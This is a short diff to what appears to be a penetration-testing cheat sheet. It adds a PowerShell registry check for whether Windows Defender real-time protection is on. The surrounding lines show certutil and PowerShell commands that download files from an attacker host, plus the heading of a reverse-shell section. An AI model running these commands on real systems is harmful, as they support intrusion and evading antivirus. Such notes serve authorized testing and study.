@@ -49,6 +49,12 @@ certutil -urlcache -split -f "http://<target ip>/<file>" "C:\Users\<User Account
 PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
 ```
 
+checking if Windows Defender is active
+
+```powershell
+get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
+```
+
 ASP & ASPX reverse shell
 
 ```shell
